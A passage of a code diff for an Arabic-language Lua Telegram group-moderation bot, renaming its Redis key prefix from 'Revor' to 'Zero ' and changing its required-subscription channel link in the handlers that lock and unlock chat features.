 end 
-Redis:del(Revor.."Revor:Lock:text"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:text"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الدردشه").unLock,"md",true)  
 return false
 end 
@@ -5649,10 +5652,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:del(Revor.."Revor:Lock:Join"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Join"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح دخول الاعضاء").unLock,"md",true)  
 return false
 end 
@@ -5661,10 +5664,10 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:del(Revor.."Revor:Lock:Bot:kick"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Bot:kick"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فـتح البوتات").unLock,"md",true)  
 return false
 end 
@@ -5673,10 +5676,10 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:del(Revor.."Revor:Lock:Bot:kick"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Bot:kick"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فـتح البوتات").unLock,"md",true)  
 return false
 end 
@@ -5685,10 +5688,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end  
-Redis:del(Revor.."Revor:Lock:tagservr"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:tagservr"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فـتح الاشعارات").unLock,"md",true)  
 return false
 end 
@@ -5697,10 +5700,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:del(Revor.."Revor:lockpin"..msg_chat_id)  
+Redis:del(Zero .."Zero :lockpin"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فـتح التثبيت هنا").unLock,"md",true)  
 return false
 end 
@@ -5709,10 +5712,10 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:del(Revor.."Revor:Lock:edit"..msg_chat_id) 
+Redis:del(Zero .."Zero :Lock:edit"..msg_chat_id) 
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فـتح تعديل").unLock,"md",true)  
 return false
 end 
@@ -5721,10 +5724,10 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:del(Revor.."Revor:Lock:edit"..msg_chat_id) 
+Redis:del(Zero .."Zero :Lock:edit"..msg_chat_id) 
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فـتح تعديل").unLock,"md",true)  
 return false
 end 
@@ -5733,13 +5736,13 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end 
-Redis:del(Revor.."Revor:Lock:tagservrbot"..msg_chat_id)   
+Redis:del(Zero .."Zero :Lock:tagservrbot"..msg_chat_id)   
 list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
 for i,lock in pairs(list) do 
-Redis:del(Revor..'Revor:'..lock..msg_chat_id)    
+Redis:del(Zero ..'Zero :'..lock..msg_chat_id)    
 end
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فـتح جميع الاوامر").unLock,"md",true)  
 return false
@@ -5750,50 +5753,50 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:hset(Revor.."Revor:Spam:Group:User"..msg_chat_id ,"Spam:User","del")  
+Redis:hset(Zero .."Zero :Spam:Group:User"..msg_chat_id ,"Spam:User","del")  
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التكرار").Lock,"md",true)  
 elseif text == "قفل التكرار بالتقيد" then 
 if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:hset(Revor.."Revor:Spam:Group:User"..msg_chat_id ,"Spam:User","keed")  
+Redis:hset(Zero .."Zero :Spam:Group:User"..msg_chat_id ,"Spam:User","keed")  
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التكرار").lockKid,"md",true)  
 elseif text == "قفل التكرار بالكتم" then 
 if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:hset(Revor.."Revor:Spam:Group:User"..msg_chat_id ,"Spam:User","mute")  
+Redis:hset(Zero .."Zero :Spam:Group:User"..msg_chat_id ,"Spam:User","mute")  
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التكرار").lockKtm,"md",true)  
 elseif text == "قفل التكرار بالطرد" then 
 if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:hset(Revor.."Revor:Spam:Group:User"..msg_chat_id ,"Spam:User","kick")  
+Redis:hset(Zero .."Zero :Spam:Group:User"..msg_chat_id ,"Spam:User","kick")  
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التكرار").lockKick,"md",true)  
 elseif text == "فتح التكرار" then 
 if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:hdel(Revor.."Revor:Spam:Group:User"..msg_chat_id ,"Spam:User")  
+Redis:hdel(Zero .."Zero :Spam:Group:User"..msg_chat_id ,"Spam:User")  
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح التكرار").unLock,"md",true)  
 end
 if text == "قفل الروابط" then 
@@ -5801,10 +5804,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Link"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Link"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الروابط").Lock,"md",true)  
 return false
 end 
@@ -5813,10 +5816,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Link"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Link"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الروابط").lockKid,"md",true)  
 return false
 end 
@@ -5825,10 +5828,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Link"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Link"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الروابط").lockKtm,"md",true)  
 return false
 end 
@@ -5837,10 +5840,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Link"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Link"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الروابط").lockKick,"md",true)  
 return false
 end 
@@ -5849,10 +5852,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Link"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Link"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الروابط").unLock,"md",true)  
 return false
 end 
@@ -5861,10 +5864,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:User:Name"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:User:Name"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل المعرفات").Lock,"md",true)  
 return false
 end 
@@ -5873,10 +5876,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:User:Name"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:User:Name"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل المعرفات").lockKid,"md",true)  
 return false
 end 
@@ -5885,10 +5888,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:User:Name"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:User:Name"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل المعرفات").lockKtm,"md",true)  
 return false
 end 
@@ -5897,10 +5900,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:User:Name"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:User:Name"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل المعرفات").lockKick,"md",true)  
 return false
 end 
@@ -5909,10 +5912,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:User:Name"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:User:Name"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح المعرفات").unLock,"md",true)  
 return false
 end 
@@ -5921,10 +5924,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:hashtak"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:hashtak"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التاك").Lock,"md",true)  
 return false
 end 
@@ -5933,10 +5936,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:hashtak"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:hashtak"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التاك").lockKid,"md",true)  
 return false
 end 
@@ -5945,10 +5948,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:hashtak"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:hashtak"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التاك").lockKtm,"md",true)  
 return false
 end 
@@ -5957,10 +5960,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:hashtak"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:hashtak"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التاك").lockKick,"md",true)  
 return false
 end 
@@ -5969,10 +5972,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:hashtak"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:hashtak"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح التاك").unLock,"md",true)  
 return false
 end 
@@ -5981,10 +5984,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Cmd"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Cmd"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الشارحه").Lock,"md",true)  
 return false
 end 
@@ -5993,10 +5996,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
